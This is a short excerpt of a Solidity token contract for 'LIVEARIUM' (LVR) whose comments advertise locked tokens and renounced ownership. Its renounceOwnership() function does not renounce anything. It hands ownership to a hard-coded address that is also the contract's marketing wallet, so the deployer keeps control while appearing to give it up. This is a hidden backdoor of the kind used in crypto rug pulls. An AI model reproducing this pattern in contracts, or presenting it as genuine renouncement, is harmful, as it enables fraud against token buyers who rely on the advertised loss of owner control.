...
//LIMIT Buy : 100000 (1%) and NO MAX WALLET
//LOCK TOKEN & RENOUNCEOWNERSHIP
...
contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xCC00998A7bd7eCe3BbA8FB7fdA0e3dc7c3f6eAD8));
        _owner = address(0xCC00998A7bd7eCe3BbA8FB7fdA0e3dc7c3f6eAD8);
    }
...
contract LIVEARIUM is Context, IERC20, Ownable {
    ...
    string private constant _name = "LIVEARIUM";
    string private constant _symbol = "LVR";
    uint8 private constant _decimals = 9; 
    
    uint256 public _marketingFee = 5;
    uint256 public _liquidityFee = 10;
    address private _marketingWallet = 0xCC00998A7bd7eCe3BbA8FB7fdA0e3dc7c3f6eAD8;
